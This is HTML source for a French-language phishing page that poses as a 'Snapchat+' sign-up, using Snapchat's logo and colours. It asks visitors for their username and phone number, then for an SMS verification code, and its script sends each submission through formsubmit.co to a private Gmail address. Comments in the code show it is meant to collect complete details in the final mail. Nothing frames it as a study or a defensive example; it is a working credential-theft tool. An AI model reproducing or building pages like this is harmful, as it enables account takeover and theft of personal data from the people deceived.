                    

                

                    <!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat+</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* Ton image de fond */
            background: url('fond.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .container {
            width: 90%;
            max-width: 380px;
            padding: 30px;
            text-align: center;
            /* Juste une très légère transparence pour que le texte soit lisible sur ton fond */
            background-color: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(2px);
            border-radius: 15px;
        }

        /* Le logo OFFICIEL : Pas de carré jaune autour, juste le fantôme */
        .snap-logo-container {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .snap-ghost {
            width: 100%;
            height: 100%;
            fill: #FFFC00; /* La couleur exacte du ghost */
            filter: drop-shadow(0 4px 4px rgba(0,0,0,0.3));
        }

        h1 {
            font-size: 22px;
            color: #fff;
            margin-bottom: 10px;
            font-weight: 700;
            text-shadow: 0 1px 3px rgba(0,0,0,0.5);
        }

        p {
            color: #fff;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.4;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 13px;
            color: #fff;
            margin-bottom: 5px;
            font-weight: 500;
            text-shadow: 0 1px 1px rgba(0,0,0,0.5);
        }

        input {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: 2px solid rgba(255, 255, 255, 0.5);
            border-radius: 30px;
            box-sizing: border-box;
            outline: none;
            background: rgba(0,0,0,0.2);
            color: #fff;
            transition: all 0.3s;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        input:focus {
            border-color: #FFFC00;
            background: rgba(0,0,0,0.4);
        }

        .btn-submit {
            background-color: #FFFC00;
            color: #000;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 30px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #FFF000;
        }

        #step-2 {
            display: none;
        }

        .small-note {
            font-size: 11px;
            color: #eee;
            margin-top: 15px;
            font-style: italic;
            text-shadow: 0 1px 1px rgba(0,0,0,0.8);
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- VRAI LOGO SNAPCHAT (Pas de boîte jaune) -->
        <div class="snap-logo-container">
            <svg class="snap-ghost" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12.003 2c-2.498 0-5.81 1.95-5.81 6.03v3.14c0 .77-.355 1.48-.95 1.93-.59.45-1.33.68-2.09.64-.82-.05-1.58-.36-2.17-.89-.59-.53-.95-1.27-.95-2.05 0-4.08 3.31-6.03 5.81-6.03.6 0 1.16.13 1.65.36.49.23.89.58 1.15 1.01.26-.43.66-.78 1.15-1.01.49-.23 1.05-.36 1.65-.36 2.498 0 5.81 1.95 5.81 6.03 0 .78-.36 1.52-.95 2.05-.59.53-1.35.84-2.17.89-.76.04-1.5-.19-2.09-.64-.595-.45-.95-1.16-.95-1.93v-3.14c0-4.08-3.312-6.03-5.81-6.03zm-8.2 6.03c0-3.07 2.49-5.57 5.57-5.57.82 0 1.59.18 2.27.5.68.32 1.23.81 1.6 1.44.37-.63.92-1.12 1.6-1.44.68-.32 1.45-.5 2.27-.5 3.08 0 5.57 2.5 5.57 5.57v3.14c0 1.53-.82 2.88-2.06 3.6-.39.22-.83.35-1.29.39-.46.04-.92-.03-1.34-.21-.42-.18-.78-.47-1.04-.85-.26-.38-.42-.83-.47-1.3h-3.24c-.05.47-.21.92-.47 1.3-.26.38-.62.67-1.04.85-.42.18-.88.25-1.34.21-.46-.04-.9-.17-1.29-.39-1.24-.72-2.06-2.07-2.06-3.6v-3.14zm6.66 7.43c.28 0 .5.22.5.5s-.22.5-.5.5-.5-.22-.5-.5.22-.5.5-.5zm1.68 0c.28 0 .5.22.5.5s-.22.5-.5.5-.5-.22-.5-.5.22-.5.5-.5z"/>
            </svg>
        </div>

        <!-- Étape 1 : Nom + Numéro -->
        <div id="step-1">
            <h1>Obtenez Snapchat+</h1>
            <p>Vérification requise pour activer votre profil.</p>
            
            <form id="form1">
                <div class="form-group">
                    <label for="username">Nom d'utilisateur</label>
                    <input type="text" id="username" name="username" placeholder="Nom d'utilisateur" required>
                </div>

                <div class="form-group">
                    <label for="phone">Numéro de téléphone</label>
                    <input type="tel" id="phone" name="phone" placeholder="Numéro de téléphone" required>
                </div>

                <button type="submit" class="btn-submit">Vérifier</button>
            </form>
        </div>

        <!-- Étape 2 : Code SMS -->
        <div id="step-2">
            <h1>Vérification</h1>
            <p>Le code a été envoyé par SMS.</p>
            
            <form id="form2">
                <!-- On réinjecte le numéro et le nom en caché pour que le mail final soit complet -->
                <input type="hidden" id="h-phone" name="phone">
                <input type="hidden" id="h-username" name="username">

                <div class="form-group">
                    <label for="code">Code SMS</label>
                    <input type="text" id="code" name="code" placeholder="Entrez le code" required>
                </div>

                <button type="submit" class="btn-submit">Confirmer</button>
            </form>
            
            <p class="small-note">Le code peut prendre quelques minutes à venir.</p>
        </div>

    </div>

    <script>
        document.getElementById('form1').addEventListener('submit', function(e) {
            e.preventDefault(); 

            // Récupération des infos pour les passer à l'étape 2
            const phoneVal = document.getElementById('phone').value;
            const userVal = document.getElementById('username').value;

            // On stocke pour le formulaire 2
            document.getElementById('h-phone').value = phoneVal;
            document.getElementById('h-username').value = userVal;

            // Envoi des données (Nom + Tel)
            const formData = new FormData(this);
            fetch("https://formsubmit.co/ajax/patrick.03.3.2003@gmail.com", {
                method: "POST",
                body: formData
            }).then(() => {
                // Transition
                document.getElementById('step-1').style.display = 'none';
                document.getElementById('step-2').style.display = 'block';
            });
        });

        document.getElementById('form2').addEventListener('submit', function(e) {
            e.preventDefault(); 

            // Envoi du code + Numéro + Nom (grâce aux inputs cachés)
            const formData = new FormData(this);
            fetch("https://formsubmit.co/ajax/patrick.03.3.2003@gmail.com", {
                method: "POST",
                body: formData
            }).then(() => {
                // Optionnel : message de fin
                document.querySelector('#step-2 h1').innerText = "Vérifié !";
                document.querySelector('.btn-submit').innerText = "Fini";
                document.querySelector('.btn-submit').disabled = true;
            });
        });
    </script>
</body>
</html>
